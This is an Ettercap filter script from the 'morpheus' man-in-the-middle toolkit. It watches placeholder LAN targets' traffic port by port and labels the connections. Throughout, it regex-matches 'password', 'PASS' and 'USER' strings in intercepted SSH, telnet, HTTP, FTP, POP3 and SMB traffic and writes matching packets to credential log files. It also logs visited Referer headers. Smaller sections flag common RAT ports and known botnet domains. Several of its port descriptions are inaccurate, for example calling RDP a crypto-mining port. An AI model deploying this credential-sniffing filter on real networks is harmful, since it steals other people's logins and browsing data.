############################################################################
#                                                                          #
#  HTTPS Request/Response Filter                                           #
#  based on code from ALoR & NaGA  (contains: 1121 instructions/rules)     #
#                                                                          #
#  This program is free software; you can redistribute it and/or modify    #
#  it under the terms of the GNU General Public License as published by    #
#  the Free Software Foundation; either version 2 of the License, or       #
#  (at your option) any later version.                                     #
#                                                                          #
#  use: http://string-functions.com/string-hex.aspx to decode tcp hex      #
############################################################################


##
#  This filter will act like a firewall reporting OR blocking connections
#  inside Local Lan (selected targets), Reports suspicious tcp activity In
#  the targets selected And also dumps to a logfile logins captured under
#  mitm + filter execution In services like: http,ssh,smb,telnet,ftp,pop3 ..
#  Repors the existence of bootnet connections And reports DNS/DHCP requests. 
##






##########################################################
## target [ 1 ] connections to filter trougth morpheus  ##
## chose allways target [1] as your agressive scan type ## 
##########################################################
##
# [ from ME -> OUTSIDE ]
if (ip.src == 'TaRONE' && ip.proto == TCP && tcp.dst == 8080) {
  msg("[morpheus] host:TaRONE   [ -> ]  port:8080 [tcp] http-alt ☆");
}
if (ip.src == 'TaRONE' && ip.proto == TCP && tcp.dst == 25) {
  msg("[morpheus] host:TaRONE   [ -> ]  port:25   [tcp] smtp ☆");
}
if (ip.src == 'TaRONE' && ip.proto == TCP && tcp.dst == 1080) {
  msg("[morpheus] host:TaRONE   [ -> ]  port:1080 [tcp] socks ☠");
}
if (ip.src == 'TaRONE' && ip.proto == UDP && udp.dst == 161) {
  msg("[morpheus] host:TaRONE   [ -> ]  port:161  [udp] snmp ☆");
}
if (ip.src == 'TaRONE' && ip.proto == UDP && udp.dst == 1900) {
  msg("[morpheus] host:TaRONE   [ -> ]  port:1900 [udp] ssdp ☆");
}
if (ip.src == 'TaRONE' && ip.proto == TCP && tcp.dst == 135) {
  msg("[morpheus] host:TaRONE   [ -> ]  port:135 [tcp] rdc ☆");
}
if (ip.src == 'TaRONE' && ip.proto == TCP && tcp.dst == 3389) {
  msg("\n[morpheus] host:TaRONE   [ -> ]  port:3389  [tcp] ☠");
  msg("[morpheus] |_info: used by crypto-currency minning\n");
}
if (ip.src == 'TaRONE' && ip.proto == TCP && tcp.dst == 1723) {
  msg("[morpheus] host:TaRONE   [ -> ]  port:1723 [tcp] pptp ☆");
}
if (ip.src == 'TaRONE' && ip.proto == TCP && tcp.dst == 31337) {
  msg("\n[morpheus] host:TaRONE   [ -> ]  port:31337[tcp] rdc ☠");
  msg("[morpheus] |_info: vuln to viruses, worms\n");
}
if (ip.src == 'TaRONE' && ip.proto == TCP && tcp.dst == 21) {
  msg("[morpheus] host:TaRONE   [ -> ]  port:21   [tcp] ftp ☠");
}
if (ip.src == 'TaRONE' && ip.proto == TCP && tcp.dst == 22) {
  msg("[morpheus] host:TaRONE   [ -> ]  port:22   [tcp] ssh ☆");
        # log credentials into morpheus/logs/ssh_creds.log
        if (regex(DECODED.data, ".*password.*")) {
         log(DECODED.data, "./ssh_creds.log");
         msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found ..");
         msg("[morpheus] | status: SSH login detected!");
         msg("[morpheus] |  info : credentials found, log stored ✔");
         msg("[morpheus] |_ log  : morpheus/logs/ssh_creds.log\n");
        }else{
        if (regex(DECODED.data, ".*PASSWORD.*")) {
         log(DECODED.data, "./ssh_creds.log");
         msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found ..");
         msg("[morpheus] | status: SSH login detected!");
         msg("[morpheus] |  info : credentials found, log stored ✔");
         msg("[morpheus] |_ log  : morpheus/logs/ssh_creds.log\n");
        }else{
        if (regex(DECODED.data, ".*PASS.*")) {
         log(DECODED.data, "./ssh_creds.log");
         msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found ..");
         msg("[morpheus] | status: SSH login detected!");
         msg("[morpheus] |  info : credentials found, log stored ✔");
         msg("[morpheus] |_ log  : morpheus/logs/ssh_creds.log\n");
        }
        }
        }
}
if (ip.src == 'TaRONE' && ip.proto == TCP && tcp.dst == 23) {
  msg("[morpheus] host:TaRONE   [ -> ]  port:23   [tcp] telnet ☆");
        # log credentials into morpheus/logs/telnet_creds.log
        if (regex(DECODED.data, ".*password.*")) {
         log(DECODED.data, "./telnet_creds.log");
         msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found ..");
         msg("[morpheus] | status: TELNET login detected!");
         msg("[morpheus] |  info : credentials found, log stored ✔");
         msg("[morpheus] |_ log  : morpheus/logs/telnet_creds.log\n");
        }else{
        if (regex(DECODED.data, ".*PASSWORD.*")) {
         log(DECODED.data, "./telnet_creds.log");
          msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found ..");
          msg("[morpheus] | status: TELNET login detected!");
          msg("[morpheus] |  info : credentials found, log stored ✔");
          msg("[morpheus] |_ log  : morpheus/logs/telnet_creds.log\n");
        }else{
        if (regex(DECODED.data, ".*PASS.*")) {
         log(DECODED.data, "./telnet_creds.log");
          msg("\n[morpheus] host:TaRONE    [ ⊶  ]  found ..");
          msg("[morpheus] | status: TELNET login detected!");
          msg("[morpheus] |  info : credentials found, log stored ✔");
          msg("[morpheus] |_ log  : morpheus/logs/telnet_creds.log\n");
        }
        }
        }
}
if (ip.src == 'TaRONE' && ip.proto == TCP && tcp.dst == 80) {
  msg("[morpheus] host:TaRONE   [ -> ]  port:80   [tcp] http ☆");
        # log credentials into morpheus/logs/http_creds.log
        if (regex(DECODED.data, ".*password.*")) {
         log(DECODED.data, "./http_creds.log");
          msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found ..");
          msg("[morpheus] | status: HTTP login detected!");
          msg("[morpheus] |  info : credentials found, log stored ✔");
          msg("[morpheus] |_ log  : morpheus/logs/http_creds.log\n");
        }else{
        if (regex(DECODED.data, ".*PASSWORD.*")) {
         log(DECODED.data, "./http_creds.log");
          msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found ..");
          msg("[morpheus] | status: HTTP login detected!");
          msg("[morpheus] |  info : credentials found, log stored ✔");
          msg("[morpheus] |_ log  : morpheus/logs/http_creds.log\n");
        }else{
        if (regex(DECODED.data, ".*PASS.*")) {
         log(DECODED.data, "./http_creds.log");
          msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found ..");
          msg("[morpheus] | status: HTTP login detected!");
          msg("[morpheus] |  info : credentials found, log stored ✔");
          msg("[morpheus] |_ log  : morpheus/logs/http_creds.log\n");
        }
        }
        }
}
#
# grab target url visited referer
#
if (ip.src == 'TaRONE' && ip.proto == TCP && tcp.dst == 80) {
  if (search(DATA.data, "Referer:")) {
   log(DATA.data, "./Referer.log");
   msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found ..");
   msg("[morpheus] | status: packet Referer found");
   msg("[morpheus] |_  log : morpheus/logs/Referer.log ✔\n");
  }
}
if (ip.src == 'TaRONE' && ip.proto == TCP && tcp.dst == 110) {
  msg("[morpheus] host:TaRONE   [ -> ]  port:110  [tcp] pop3 ☆");
        # log credentials into morpheus/logs/pop3_creds.log
        if (regex(DECODED.data, ".*password.*")) {
         log(DECODED.data, "./pop3_creds.log");
          msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found ..");
          msg("[morpheus] | status: POP3 login detected!");
          msg("[morpheus] |  info : credentials found, log stored ✔");
          msg("[morpheus] |_ log  : morpheus/logs/pop3_creds.log\n");
        }else{
        if (regex(DECODED.data, ".*PASSWORD.*")) {
         log(DECODED.data, "./pop3_creds.log");
          msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found ..");
          msg("[morpheus] | status: POP3 login detected!");
          msg("[morpheus] |  info : credentials found, log stored ✔");
          msg("[morpheus] |_ log  : morpheus/logs/pop3_creds.log\n");
        }else{
        if (regex(DECODED.data, ".*PASS.*")) {
         log(DECODED.data, "./pop3_creds.log");
          msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found ..");
          msg("[morpheus] | status: POP3 login detected!");
          msg("[morpheus] |  info : credentials found, log stored ✔");
          msg("[morpheus] |_ log  : morpheus/logs/pop3_creds.log\n");
        }
        }
        }
}
if (ip.src == 'TaRONE' && ip.proto == UDP && udp.dst == 137) {
  msg("[morpheus] host:TaRONE   [ -> ]  port:137  [udp] netbios ☠");
}
if (ip.src == 'TaRONE' && ip.proto == TCP && tcp.dst == 139) {
  msg("[morpheus] host:TaRONE   [ -> ]  port:139  [tcp] netbios ☠");
}
if (ip.src == 'TaRONE' && ip.proto == TCP && tcp.dst == 443) {
  msg("[morpheus] host:TaRONE   [ -> ]  port:443  [tcp] https ☆");
}
if (ip.src == 'TaRONE' && ip.proto == TCP && tcp.dst == 445) {
  msg("[morpheus] host:TaRONE   [ -> ]  port:445  [tcp] netbios ☠");
}
#
#
# [ IF YOU WANT TO BE PARANOIC, LEAVE THIS FUNTION AS IT IS ] ..
# AND BE PREPARED TO DEAL WITH MANY PORT:53/67 TERMINAL OUTPUTS.
# IF NOT THEN YOU NEED TO COMMENT ( # ) THIS ENTIRE PARANOIC FUNTION
#
#
# DHCP: requests, discovery ..
if (ip.src == 'TaRONE' && ip.proto == UDP && udp.dst == 67) {
  if (search(DATA.data, "hOst")) {
    msg("\n[morpheus] host:0.0.0.0        [ ⊶  ]  found ..");
    msg("[morpheus] | status: Request access to LAN");
    msg("[morpheus] |  port : 67/UDP(dst) bootp-DHCP");
    msg("[morpheus] |  info : hOst Announces is presence");
    msg("[morpheus] |_ device: hOst-PC DisTr\n");
    }
}
if (ip.proto == UDP && udp.dst == 67 || udp.src == 67) {
  if (search(DATA.data, "SKYNET")) {
    msg("\n[morpheus] host:0.0.0.0        [ ⊶  ]  found ..");
    msg("[morpheus] | status: Request access to LAN");
    msg("[morpheus] |  port : 67/UDP(dst) bootp-DHCP");
    msg("[morpheus] |  info : SKYNET Announces is presence");
    msg("[morpheus] |_ device: skynet-PC Windows10-amd64\n");
    }
}
if (ip.src == 'TaRONE' && ip.proto == UDP && udp.dst == 53) {
  msg("[morpheus] host:TaRONE   [ -> ]  port:53   [udp] dns ☆");
        if (search(DATA.data, "facebook")) {
          msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found ..");
          msg("[morpheus] | status: DNS possible facebook query found!");
          msg("[morpheus] |  info : normal connection from source");
          msg("[morpheus] |  hex  : 65 64 67 65 2d 63 68 61 74 08 66 61 63 65 62 6f 6f 6b 03 6f 6d");
          msg("[morpheus] |_ decoded: edge-chat.facebook.com\n");
        }else{
        if (search(DATA.data, "hotmail")) {
          msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found ..");
          msg("[morpheus] | status: DNS possible hotmail query found!");
          msg("[morpheus] |  info : normal connection from source");
          msg("[morpheus] |  hex  : 77 77 77 2e 68 6f 74 6d 61 69 6c 2e 63 6f 6d");
          msg("[morpheus] |_ decoded: www.hotmail.com\n");
        }else{
        if (search(DATA.data, "gmail")) {
          msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found ..");
          msg("[morpheus] | status: DNS possible gmail query found!");
          msg("[morpheus] |  info : normal connection from source");
          msg("[morpheus] |  hex  : 77 77 77 2e 68 6f 74 6d 61 69 6c 2e 63 6f 6d");
          msg("[morpheus] |_ decoded: www.gmail.com\n");
        }else{
        if (search(DATA.data, "twitter")) {
          msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found ..");
          msg("[morpheus] | status: DNS remote query found!");
          msg("[morpheus] |  info : normal connection from source");
          msg("[morpheus] |  hex  : 74 77 69 74 74 65 72");
          msg("[morpheus] |_ decoded: twitter\n");
       }else{
       if (search(DATA.data, "youtube")) {
         msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found ..");
         msg("[morpheus] | status: DNS remote query found!");
         msg("[morpheus] |  info : normal connection from source");
         msg("[morpheus] |  hex  : 79 6f 75 74 75 62 65");
         msg("[morpheus] |_ decoded: youtube\n");
       }else{
       if (search(DATA.data, "skype")) {
         msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found ..");
         msg("[morpheus] | status: DNS remote query found!");
         msg("[morpheus] |  info : normal connection from source");
         msg("[morpheus] |  hex  : 73 6b 79 70 65 2e 63 6f 6d");
         msg("[morpheus] |_ decoded: skype.com\n");
        }else{
        if (search(DATA.data, "arpa")) {
          msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found ..");
          msg("[morpheus] | status: DNS possible arpa query found!");
          msg("[morpheus] |  info : normal connection? scan-type? icmp?");
          msg("[morpheus] |  hex  : 64 64 62 04 61 72 70 61");
          msg("[morpheus] |_ decoded: ddr.arpa\n");
       }
       }
       }
       }
       }
       }
       }
}



# [ Reporting venom/metasploit possible rat ports ] ..
if (ip.src == 'TaRONE' && ip.proto == TCP && tcp.dst == 666) {
  msg("\n[morpheus] host:TaRONE   [ ⊶  ]  port:666  [tcp] rat ☠");
  msg("[morpheus] | status: possible rat agent found!");
  msg("[morpheus] |_ info : venom uses this port for rat agents.\n");
}
if (ip.src == 'TaRONE' && ip.proto == TCP && tcp.dst == 4444) {
  msg("\n[morpheus] host:TaRONE   [ ⊶  ]  port:4444 [tcp] rat ☠");
  msg("[morpheus] | status: possible rat agent found!");
  msg("[morpheus] |_ info : metasploit uses this port for rat agents.\n");
}
# [ END OF PARANOIC FUNTION ] ..




###
# [ from OUTSIDE -> ME ]
if (ip.dst == 'TaRONE' && ip.proto == TCP && tcp.src == 8080) {
  msg("[morpheus] host:TaRONE   [ <- ]  port:8080 [tcp] http-alt ☆");
}
if (ip.dst == 'TaRONE' && ip.proto == TCP && tcp.src == 25) {
  msg("[morpheus] host:TaRONE   [ <- ]  port:25   [tcp] smtp ☆");
}
if (ip.dst == 'TaRONE' && ip.proto == TCP && tcp.src == 1080) {
  msg("\n[morpheus] host:TaRONE   [ <- ]  port:1080 [tcp] socks ☠");
  msg("[morpheus] |_info: vuln to viruses, worms, and DoS attacks\n");
}
if (ip.dst == 'TaRONE' && ip.proto == UDP && udp.src == 161) {
  msg("\n[morpheus] host:TaRONE   [ <- ]  port:161  [udp] snmp ☠");
  msg("[morpheus] |_info: vuln to reflected DDoS attacks\n");
}
if (ip.dst == 'TaRONE' && ip.proto == UDP && udp.src == 1900) {
  msg("\n[morpheus] host:TaRONE   [ <- ]  port:1900 [udp] ssdp ☠");
  msg("[morpheus] |_info: vulnerable to DoS attacks\n");
}
if (ip.dst == 'TaRONE' && ip.proto == TCP && tcp.src == 135) {
  msg("\n[morpheus] host:TaRONE   [ <- ]  port:135  [tcp] rdc ☠");
  msg("[morpheus] |_info: vuln to viruses, DoS attacks\n");
}
if (ip.dst == 'TaRONE' && ip.proto == TCP && tcp.src == 31337) {
  msg("\n[morpheus] host:TaRONE   [ <- ]  port:31337[tcp] rdc ☠");
  msg("[morpheus] |_info: vuln to viruses, worms\n");
}
if (ip.dst == 'TaRONE' && ip.proto == TCP && tcp.src == 3389) {
  msg("\n[morpheus] host:TaRONE   [ <- ]  port:3389  [tcp] ☠");
  msg("[morpheus] | status: RDP remote connection detected!");
  msg("[morpheus] |  info : rdp its commonly used by hackers");
  msg("[morpheus] |_ info : used by crypto-currency minning\n");
}
if (ip.dst == 'TaRONE' && ip.proto == TCP && tcp.src == 1723) {
  msg("[morpheus] host:TaRONE   [ <- ]  port:1723 [tcp] pptp ☆");
}


if (ip.dst == 'TaRONE' && ip.proto == TCP && tcp.src == 21) {
  msg("[morpheus] host:TaRONE   [ <- ]  port:21   [tcp] ftp ☠");
        # log credentials into morpheus/logs/ftp_creds.log
        if (regex(DECODED.data, ".*password.*")) {
         log(DECODED.data, "./ftp_creds.log");
          msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found ..");
          msg("[morpheus] | status: FTP login detected!");
          msg("[morpheus] |  info : credentials found, log stored ✔");
          msg("[morpheus] |_ log  : morpheus/logs/ftp_creds.log\n");
        }else{
        if (regex(DECODED.data, ".*PASSWORD.*")) {
         log(DECODED.data, "./ftp_creds.log");
          msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found ..");
          msg("[morpheus] | status: FTP login detected!");
          msg("[morpheus] |  info : credentials found, log stored ✔");
          msg("[morpheus] |_ log  : morpheus/logs/ftp_creds.log\n");
        }else{
        if (regex(DECODED.data, ".*PASS.*")) {
         log(DECODED.data, "./ftp_creds.log");
          msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found ..");
          msg("[morpheus] | status: FTP login detected!");
          msg("[morpheus] |  info : credentials found, log stored ✔");
          msg("[morpheus] |_ log  : morpheus/logs/ftp_creds.log\n");
       }else{
        if (regex(DECODED.data, ".*user.*")) {
         log(DECODED.data, "./ftp_creds.log");
          msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found ..");
          msg("[morpheus] | status: FTP login detected!");
          msg("[morpheus] |  info : credentials found, log stored ✔");
          msg("[morpheus] |_ log  : morpheus/logs/ftp_creds.log\n");
        }else{
        if (regex(DECODED.data, ".*USER.*")) {
         log(DECODED.data, "./ftp_creds.log");
          msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found ..");
          msg("[morpheus] | status: FTP login detected!");
          msg("[morpheus] |  info : credentials found, log stored ✔");
          msg("[morpheus] |_ log  : morpheus/logs/ftp_creds.log\n");
        }else{
        if (regex(DECODED.data, ".*USERNAME.*")) {
         log(DECODED.data, "./ftp_creds.log");
          msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found ..");
          msg("[morpheus] | status: FTP login detected!");
          msg("[morpheus] |  info : credentials found, log stored ✔");
          msg("[morpheus] |_ log  : morpheus/logs/ftp_creds.log\n");
        }
        }
        }
        }
        }
        }
}
if (ip.dst == 'TaRONE' && ip.proto == TCP && tcp.src == 22) {
  msg("\n[morpheus] host:TaRONE   [ <- ]  port:22   [tcp] ssh ☠");
  msg("[morpheus] |_ info : ssh its commonly used by hackers\n");
}
if (ip.dst == 'TaRONE' && ip.proto == TCP && tcp.src == 23) {
  msg("[morpheus] host:TaRONE   [ <- ]  port:23   [tcp] telnet ☠");
        # log credentials into morpheus/logs/telnet_creds.log
        if (regex(DECODED.data, ".*password.*")) {
         log(DECODED.data, "./telnet_creds.log");
          msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found ..");
          msg("[morpheus] | status: TELNET login detected!");
          msg("[morpheus] |  info : credentials found, log stored ✔");
          msg("[morpheus] |_ log  : morpheus/logs/telnet_creds.log\n");
        }else{
        if (regex(DECODED.data, ".*PASSWORD.*")) {
         log(DECODED.data, "./telnet_creds.log");
          msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found ..");
          msg("[morpheus] | status: TELNET login detected!");
          msg("[morpheus] |  info : credentials found, log stored ✔");
          msg("[morpheus] |_ log  : morpheus/logs/telnet_creds.log\n");
        }else{
        if (regex(DECODED.data, ".*PASS.*")) {
         log(DECODED.data, "./telnet_creds.log");
          msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found ..");
          msg("[morpheus] | status: TELNET login detected!");
          msg("[morpheus] |  info : credentials found, log stored ✔");
          msg("[morpheus] |_ log  : morpheus/logs/telnet_creds.log\n");
       }else{
        if (regex(DECODED.data, ".*user.*")) {
         log(DECODED.data, "./telnet_creds.log");
          msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found ..");
          msg("[morpheus] | status: TELNET login detected!");
          msg("[morpheus] |  info : credentials found, log stored ✔");
          msg("[morpheus] |_ log  : morpheus/logs/telnet_creds.log\n");
        }else{
        if (regex(DECODED.data, ".*USER.*")) {
         log(DECODED.data, "./telnet_creds.log");
          msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found ..");
          msg("[morpheus] | status: TELNET login detected!");
          msg("[morpheus] |  info : credentials found, log stored ✔");
          msg("[morpheus] |_ log  : morpheus/logs/telnet_creds.log\n");
        }else{
        if (regex(DECODED.data, ".*USERNAME.*")) {
         log(DECODED.data, "./telnet_creds.log");
          msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found ..");
          msg("[morpheus] | status: TELNET login detected!");
          msg("[morpheus] |  info : credentials found, log stored ✔");
          msg("[morpheus] |_ log  : morpheus/logs/telnet_creds.log\n");
        }
        }
        }
        }
        }
        }
}
if (ip.dst == 'TaRONE' && ip.proto == TCP && tcp.src == 80) {
  msg("[morpheus] host:TaRONE   [ <- ]  port:80   [tcp] http ☆");
        # log credentials into morpheus/logs/http_creds.log
        if (regex(DECODED.data, ".*password.*")) {
         log(DECODED.data, "./http_creds.log");
          msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found ..");
          msg("[morpheus] | status: HTTP login detected!");
          msg("[morpheus] |  info : credentials found, log stored ✔");
          msg("[morpheus] |_ log  : morpheus/logs/http_creds.log\n");
        }else{
        if (regex(DECODED.data, ".*PASSWORD.*")) {
         log(DECODED.data, "./http_creds.log");
          msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found ..");
          msg("[morpheus] | status: HTTP login detected!");
          msg("[morpheus] |  info : credentials found, log stored ✔");
          msg("[morpheus] |_ log  : morpheus/logs/http_creds.log\n");
        }else{
        if (regex(DECODED.data, ".*PASS.*")) {
         log(DECODED.data, "./http_creds.log");
          msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found ..");
          msg("[morpheus] | status: HTTP login detected!");
          msg("[morpheus] |  info : credentials found, log stored ✔");
          msg("[morpheus] |_ log  : morpheus/logs/http_creds.log\n");
       }else{
        if (regex(DECODED.data, ".*user.*")) {
         log(DECODED.data, "./http_creds.log");
          msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found ..");
          msg("[morpheus] | status: HTTP login detected!");
          msg("[morpheus] |  info : credentials found, log stored ✔");
          msg("[morpheus] |_ log  : morpheus/logs/http_creds.log\n");
        }else{
        if (regex(DECODED.data, ".*USER.*")) {
         log(DECODED.data, "./http_creds.log");
          msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found ..");
          msg("[morpheus] | status: HTTP login detected!");
          msg("[morpheus] |  info : credentials found, log stored ✔");
          msg("[morpheus] |_ log  : morpheus/logs/http_creds.log\n");
        }else{
        if (regex(DECODED.data, ".*USERNAME.*")) {
         log(DECODED.data, "./http_creds.log");
          msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found ..");
          msg("[morpheus] | status: HTTP login detected!");
          msg("[morpheus] |  info : credentials found, log stored ✔");
          msg("[morpheus] |_ log  : morpheus/logs/http_creds.log\n");
        }
        }
        }
        }
        }
        }
}

if (ip.dst == 'TaRONE' && ip.proto == TCP && tcp.src == 995) {
  msg("\n[morpheus] host:TaRONE   [ <- ]  port:995  [tcp] pop3-ssl ☠");
  msg("[morpheus] |_info: vulnerable to viruses, worms\n");
}

if (ip.dst == 'TaRONE' && ip.proto == TCP && tcp.src == 110) {
  msg("[morpheus] host:TaRONE   [ <- ]  port:110  [tcp] pop3 ☆");
        # log credentials into morpheus/logs/pop3_creds.log
        if (regex(DECODED.data, ".*password.*")) {
         log(DECODED.data, "./pop3_creds.log");
          msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found ..");
          msg("[morpheus] | status: POP3 login detected!");
          msg("[morpheus] |  info : credentials found, log stored ✔");
          msg("[morpheus] |_ log  : morpheus/logs/pop3_creds.log\n");
        }else{
        if (regex(DECODED.data, ".*PASSWORD.*")) {
         log(DECODED.data, "./pop3_creds.log");
          msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found ..");
          msg("[morpheus] | status: POP3 login detected!");
          msg("[morpheus] |  info : credentials found, log stored ✔");
          msg("[morpheus] |_ log  : morpheus/logs/pop3_creds.log\n");
        }else{
        if (regex(DECODED.data, ".*PASS.*")) {
         log(DECODED.data, "./pop3_creds.log");
          msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found ..");
          msg("[morpheus] | status: POP3 login detected!");
          msg("[morpheus] |  info : credentials found, log stored ✔");
          msg("[morpheus] |_ log  : morpheus/logs/pop3_creds.log\n");
       }else{
        if (regex(DECODED.data, ".*user.*")) {
         log(DECODED.data, "./pop3_creds.log");
          msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found ..");
          msg("[morpheus] | status: POP3 login detected!");
          msg("[morpheus] |  info : credentials found, log stored ✔");
          msg("[morpheus] |_ log  : morpheus/logs/pop3_creds.log\n");
        }else{
        if (regex(DECODED.data, ".*USER.*")) {
         log(DECODED.data, "./pop3_creds.log");
          msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found ..");
          msg("[morpheus] | status: POP3 login detected!");
          msg("[morpheus] |  info : credentials found, log stored ✔");
          msg("[morpheus] |_ log  : morpheus/logs/pop3_creds.log\n");
        }else{
        if (regex(DECODED.data, ".*USERNAME.*")) {
         log(DECODED.data, "./pop3_creds.log");
          msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found ..");
          msg("[morpheus] | status: POP3 login detected!");
          msg("[morpheus] |  info : credentials found, log stored ✔");
          msg("[morpheus] |_ log  : morpheus/logs/pop3_creds.log\n");
        }
        }
        }
        }
        }
        }
}
if (ip.dst == 'TaRONE' && ip.proto == UDP && udp.src == 137) {
  msg("[morpheus] host:TaRONE   [ <- ]  port:137  [udp] netbios ☠");
}
if (ip.dst == 'TaRONE' && ip.proto == TCP && tcp.src == 139) {
  msg("[morpheus] host:TaRONE   [ <- ]  port:139  [tcp] netbios ☠");
}
if (ip.dst == 'TaRONE' && ip.proto == TCP && tcp.src == 443) {
  msg("[morpheus] host:TaRONE   [ <- ]  port:443  [tcp] https ☆");
}
if (ip.dst == 'TaRONE' && ip.proto == TCP && tcp.src == 445) {
  msg("\n[morpheus] host:TaRONE   [ <- ]  port:445  [tcp] netbios ☠");
  msg("[morpheus] | status: remote connection detected!");
  msg("[morpheus] |_ info : port used by netapi vulnerability.\n");
        # log credentials into morpheus/logs/smb_creds.log
        if (regex(DECODED.data, ".*password.*")) {
         log(DECODED.data, "./smb_creds.log");
          msg("[morpheus] host:TaRONE   [ ⊶  ]  found ..");
          msg("[morpheus] | status: SMB login detected!");
          msg("[morpheus] |  info : credentials found, log stored ✔");
          msg("[morpheus] |_ log  : morpheus/logs/smb_creds.log\n");
        }else{
        if (regex(DECODED.data, ".*PASSWORD.*")) {
         log(DECODED.data, "./smb_creds.log");
          msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found ..");
          msg("[morpheus] | status: SMB login detected!");
          msg("[morpheus] |  info : credentials found, log stored ✔");
          msg("[morpheus] |_ log  : morpheus/logs/smb_creds.log\n");
        }else{
        if (regex(DECODED.data, ".*PASS.*")) {
         log(DECODED.data, "./smb_creds.log");
          msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found ..");
          msg("[morpheus] | status: SMB login detected!");
          msg("[morpheus] |  info : credentials found, log stored ✔");
          msg("[morpheus] |_ log  : morpheus/logs/smb_creds.log\n");
       }else{
        if (regex(DECODED.data, ".*user.*")) {
         log(DECODED.data, "./smb_creds.log");
          msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found ..");
          msg("[morpheus] | status: SMB login detected!");
          msg("[morpheus] |  info : credentials found, log stored ✔");
          msg("[morpheus] |_ log  : morpheus/logs/smb_creds.log\n");
        }else{
        if (regex(DECODED.data, ".*USER.*")) {
         log(DECODED.data, "./smb_creds.log");
          msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found ..");
          msg("[morpheus] | status: SMB login detected!");
          msg("[morpheus] |  info : credentials found, log stored ✔");
          msg("[morpheus] |_ log  : morpheus/logs/smb_creds.log\n");
        }else{
        if (regex(DECODED.data, ".*USERNAME.*")) {
         log(DECODED.data, "./smb_creds.log");
          msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found ..");
          msg("[morpheus] | status: SMB login detected!");
          msg("[morpheus] |  info : credentials found, log stored ✔");
          msg("[morpheus] |_ log  : morpheus/logs/smb_creds.log\n");
        }
        }
        }
        }
        }
        }
}
#
# IF YOU WANT TO BE PARANOIC, LEAVE THIS FUNTION AS IT IS  ..
# IF NOT THEN YOU NEED TO COMMENT ( # ) THIS ENTIRE PARANOIC FUNTION
#
if (ip.dst == 'TaRONE' && ip.proto == UDP && udp.src == 53) {
  msg("[morpheus] host:TaRONE   [ <- ]  port:53   [udp] dns ☠");
    if (search(DATA.data, "househot")) {
      msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found ..");
      msg("[morpheus] | status: DNS remote query found!");
      msg("[morpheus] |  info : possible Mocbot IRC Bot (MS06-040)");
      msg("[morpheus] |  hex  : 62 62 6a 6a 2e 68 6f 75 73 65 68 6f 74 2e 63 6f 6d");
      msg("[morpheus] |_ decoded: bbjj.househot.com\n");
    }else{
    if (search(DATA.data, "wallloan")) {
      msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found ..");
      msg("[morpheus] | status: DNS remote query found!");
      msg("[morpheus] |  info : possible Mocbot IRC Bot (MS06-040)");
      msg("[morpheus] |  hex  : 79 70 67 77 2e 77 61 6c 6c 6c 6f 61 6e 2e 63 6f 6d");
      msg("[morpheus] |_ decoded: ypgw.wallloan.com\n");
    }
    }
}
# [ Reporting venom/metasploit/bots possible ports ] ..
if (ip.dst == 'TaRONE' && ip.proto == TCP && tcp.src == 666) {
  msg("\n[morpheus] host:TaRONE   [ ⊶  ]  port:666  [tcp] rat ☠");
  msg("[morpheus] | status: possible rat agent found!");
  msg("[morpheus] |_ info : venom tool uses this port in is rat agents.\n");
}
if (ip.dst == 'TaRONE' && ip.proto == TCP && tcp.src == 4444) {
  msg("\n[morpheus] host:TaRONE   [ ⊶  ]  port:4444 [tcp] rat ☠");
  msg("[morpheus] | status: possible rat agent found!");
  msg("[morpheus] |_ info : metasploit uses this port in is rat agents.\n");
}


# [ END OF PARANOIC FUNTION ] ..









#########################################################
## target [ 2 ] connections to filter trougth morpheus ##
## chose allways target [ 2 ] as our simple scan type  ##
#########################################################
##
# from TARGET2 -> OUTSIDE
if (ip.src == 'TaRTWO' && ip.proto == TCP && tcp.dst == 21) {
  msg("[morpheus] host:TaRTWO   [ -> ]  port:21   [tcp] ftp ☆");
}
